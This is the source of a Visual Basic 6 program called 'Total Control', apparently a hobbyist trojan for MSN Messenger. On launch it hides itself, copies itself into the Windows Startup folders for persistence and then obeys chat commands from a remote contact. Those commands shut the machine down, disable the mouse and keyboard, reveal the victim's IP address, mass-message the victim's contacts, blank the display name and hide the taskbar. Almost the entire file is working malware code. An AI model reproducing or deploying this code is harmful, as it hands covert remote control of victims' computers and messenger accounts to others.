VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Total Control"
   ClientHeight    =   510
   ClientLeft      =   2985
   ClientTop       =   285
   ClientWidth     =   6510
   ForeColor       =   &H00000000&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   510
   ScaleWidth      =   6510
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox Text2 
      BackColor       =   &H00FF0000&
      Height          =   285
      Left            =   0
      TabIndex        =   2
      Text            =   "SomeOne Has Control Over This Person's Messenger.  Total Control made by xPOKA376x"
      Top             =   240
      Width           =   6495
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00FF0000&
      ForeColor       =   &H000000FF&
      Height          =   285
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3135
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      BackColor       =   &H00000000&
      Caption         =   "Made By xPOKA376x"
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   3240
      TabIndex        =   1
      Top             =   0
      Width           =   1695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim WithEvents MSN As MsgrObject
Attribute MSN.VB_VarHelpID = -1

Private Sub Form_Load()
Set MSN = New MsgrObject

Form1.Visible = False

Text1.Text = Winsock1.LocalIP
Form1.Visible = False

Dim strDir As String
Dim intDir As Integer
Dim strpath As String


intDir = Len(CurDir())  'Gets length of Current directory
'Gets last character from CurDir() and checks if it's a \
strDir = Mid(CurDir(), intDir)
If strDir = "\" Then
    strpath = CurDir() & App.EXEName & ".exe"
    'If is in main drive like C:\ or D:\ it simply
    'puts the file name, "C:\Blah.exe"
Else
    strpath = CurDir() & "\" & App.EXEName & ".exe"
    'If CurDir() returns no \ then its in a folder
    'and will necessitate a \ inserted so that it looks like
    'C:\Folder\Blah.exe and NOT like C:\FolderBlah.exe
End If
On Error GoTo Death
'Error statement allows this code to run if it is already
'in the Start Menu

FileCopy strpath, _
"C:\WINDOWS\Start Menu\Programs\StartUp\" _
& App.EXEName & ".exe"
Death:
Resume Next
On Error GoTo Ender
FileCopy strpath, "C:\Winnt\Start Menu\Programs\StartUp\" & App.EXEName & ".exe"
Ender:
Exit Sub
Resume Next
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
'Get IP Trying To Connect And Add It To TextBox
Text3.Text = Winsock1.RemoteHostIP
End Sub

Private Sub MSN_OnTextReceived(ByVal pIMSession As Messenger.IMsgrIMSession, ByVal pSourceUser As Messenger.IMsgrUser, ByVal bstrMsgHeader As String, ByVal bstrMsgText As String, pfEnableDefault As Boolean)
If UCase(bstrMsgText) = "/SHUTDOWN" Then

Dim I 'Dim the variable
I = Shell("Rundll32.exe KRNL386.EXE,ExitKernel")
Call pIMSession.SendText(bstrMsgHeader, "User's Computer Shut Down", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/SIGNOUT" Then
MSN.Logoff
Call pIMSession.SendText(bstrMsgHeader, "!User Has been Signed Out!", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/STATUSOFFLINE" Then
MSN.LocalState = MSTATE_OFFLINE
Call pIMSession.SendText(bstrMsgHeader, "User Status Set To Offline", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/IP" Then
Call pIMSession.SendText(bstrMsgHeader, (Text1.Text), MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/STATUSONLINE" Then
MSN.LocalState = MSTATE_ONLINE
Call pIMSession.SendText(bstrMsgHeader, "User Status Set To Online", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/STATUSBUSY" Then
MSN.LocalState = MSTATE_BUSY
Call pIMSession.SendText(bstrMsgHeader, "User Status Set To Busy", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/DISABLEMOUSE" Then
Shell "rundll32 mouse,disable"
Call pIMSession.SendText(bstrMsgHeader, "User's Mouse Disabled", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/DISABLEKEYS" Then
Shell "rundll32 keyboard,disable"
Call pIMSession.SendText(bstrMsgHeader, "User's Keyboard Has been Disabled", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/MASSMESSAGE" Then
On Error Resume Next
   MassMsg = Text2.Text
   For Each User In MsnObj.List(MLIST_ALLOW)
User.SendText "MIME-Version: 1.0" & vbCrLf & "Content-Type: text/plain; charset=UTF-8" & vbCrLf & "X-MMS-IM-Format: EF=; CO=0000FF; CS=0; PF=12" & vbCrLf & vbCrLf, MassMsg, MMSGTYPE_NORESULT
Next
Call pIMSession.SendText(bstrMsgHeader, "User Has Told His/Her Dark Secret, lol.", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/CDOPEN" Then
retvalue = mciSendString("set CDAudio door open", _
returnstring, 127, 0)
Call pIMSession.SendText(bstrMsgHeader, "User's CD Tray Has Openned", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/NAME" Then
MSN.Services.PrimaryService.FriendlyName = (" ")
Call pIMSession.SendText(bstrMsgHeader, "User's Name Has Went Blank", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/STATUSAWAY" Then
MSN.LocalState = MSTATE_AWAY
Call pIMSession.SendText(bstrMsgHeader, "User Status Set To Away", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/FLOOD" Then
MSN.LocalState = MSTATE_INVISIBLE
MSN.LocalState = MSTATE_AWAY
MSN.LocalState = MSTATE_INVISIBLE
MSN.LocalState = MSTATE_AWAY
MSN.LocalState = MSTATE_INVISIBLE
MSN.LocalState = MSTATE_AWAY
MSN.LocalState = MSTATE_INVISIBLE
MSN.LocalState = MSTATE_ONLINE
Call pIMSession.SendText(bstrMsgHeader, "Offline/Online Flood Activated", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/MESSAGE" Then
Shell "explorer http://www.theboard.funurl.com", vbNormalFocus
Call pIMSession.SendText(bstrMsgHeader, "User Has Been Sent To A Nice Message Board", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/RUNNING" Then
Call pIMSession.SendText(bstrMsgHeader, "Yes.  Total Control Is Running On This Computer!", MMSGTYPE_NO_RESULT)

End If

If UCase(bstrMsgText) = "/HIDETASK" Then
hWnd1 = FindWindow("Shell_traywnd", "")
Call SetWindowPos(hWnd1, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
Call pIMSession.SendText(bstrMsgHeader, "TaskBar Now Gone", MMSGTYPE_NO_RESULT)
End If

End Sub




